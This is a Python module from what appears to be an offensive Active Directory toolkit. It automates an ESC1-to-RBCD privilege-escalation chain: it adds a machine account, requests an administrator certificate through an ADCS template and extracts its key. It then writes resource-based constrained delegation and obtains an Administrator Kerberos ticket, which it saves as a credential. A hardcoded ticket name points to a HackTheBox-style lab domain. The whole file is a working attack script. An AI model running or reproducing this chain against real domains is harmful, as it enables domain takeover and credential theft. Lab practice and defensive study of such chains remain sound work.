def run(args):
    from core.runner import run_module_by_name
    from core.target import (
        load_current_profile,
        target_set_cred,
        target_add_cred
    )
    from core.paths import get_chain_artifacts_dir
    import argparse
    import os
    from pathlib import Path

    # Standard data loading
    data, _ = load_current_profile()
    artifacts = get_chain_artifacts_dir(data["name"], "esc1-rbcd")

    # ---------------- PRECHECK ----------------
    if not data.get("domain") or not data.get("ip"):
        print("[!] Error: Domain and IP must be set in the profile.")
        return

    # Check for ADCS templates from previous enumeration
    adcs = data.get("adcs", {})
    templates = adcs.get("templates", [])

    if not templates:
        print("[-] No ADCS templates found (run ad.certfind first)")
        return

    # User confirmation (matching the AS-REP style)
    if not getattr(args, "auto", False):
        if not input(f"[?] Start ESC1 -> RBCD chain? (Y/n): ").lower() in ["", "y"]:
            return

    template = templates[0]["name"]
    print(f"[+] Using template: {template}")

    # ---------------- STEP 1: Add Computer ----------------
    print("[*] Step 1: Adding machine account...")

    # Force use of initial user (identifier 0) to avoid chaining with unintended creds
    target_set_cred(argparse.Namespace(identifier=0))
    run_module_by_name("ad.addcomputer", [], data)

    # Identify the newly created machine account
    machine = None
    for c in reversed(data.get("creds", [])):
        if c["user"].endswith("$"):
            machine = c["user"]
            break

    if not machine:
        print("[-] Failed to identify machine account")
        return

    print(f"[+] Machine: {machine}")

    # Switch context to the new machine account for the cert request
    target_set_cred(argparse.Namespace(identifier=machine))

    # ---------------- STEP 2: Cert Request ----------------
    print("[*] Step 2: Requesting certificate...")
    
    # Run the module
    run_module_by_name("ad.certreq", [template, "--user", "administrator"], data)

    # Assign the pfx variable by checking both CWD and artifacts
    pfx = None
    local_pfx = Path("administrator.pfx")
    
    if local_pfx.exists():
        # Move it to artifacts so the rest of the toolkit can find it later
        import shutil
        shutil.move(str(local_pfx), artifacts / "administrator.pfx")
        pfx = artifacts / "administrator.pfx"
        print(f"[+] Found and moved PFX to: {pfx}")
    else:
        # Fallback: check if it's already in artifacts
        pfx_files = sorted(artifacts.glob("*.pfx"), key=os.path.getmtime)
        if pfx_files:
            pfx = pfx_files[-1]

    if not pfx:
        print("[-] Error: Could not find administrator.pfx")
        return

    # ---------------- STEP 3: Extract ----------------
    print("[*] Step 3: Extracting certificate...")
    run_module_by_name("ad.pfxextract", [str(pfx)], data)

    crt_files = sorted(artifacts.glob("*.crt"), key=os.path.getmtime)
    key_files = sorted(artifacts.glob("*.key"), key=os.path.getmtime)

    if not crt_files or not key_files:
        print("[-] Missing CRT or KEY")
        return

    crt = crt_files[-1]
    key = key_files[-1]

    # ---------------- STEP 4: RBCD ----------------
    print("[*] Step 4: Writing RBCD...")
    run_module_by_name("ad.rbcd-write", [str(crt), str(key)], data)

    # ---------------- STEP 5: GetST ----------------
    print("[*] Step 5: Getting service ticket...")
    run_module_by_name("ad.getst", [], data)

    # ---------------- STEP 6: Capture Ticket ----------------
    expected_ticket = "Administrator@cifs_authority.authority.htb@AUTHORITY.HTB.ccache"
    
    if os.path.exists(expected_ticket):
        import shutil
        shutil.move(expected_ticket, artifacts / expected_ticket)
        print(f"[+] Moved ticket to artifacts.")

    ticket_files = sorted(artifacts.glob("*.ccache"), key=os.path.getmtime)

    if not ticket_files:
        print("[-] No ticket generated in artifacts or CWD")
        return

    ticket = ticket_files[-1]
    print(f"[+] Ticket: {ticket.name}")

    # add to creds manually
    target_add_cred(
        argparse.Namespace(
            user="Administrator",
            password=None,
            hash=None,
            aes=None,
            ccache=str(ticket)
        )
    )

    # switch to admin
    target_set_cred(argparse.Namespace(identifier="Administrator"))

    print("\n-------- ESC1 → RBCD Chain Complete --------")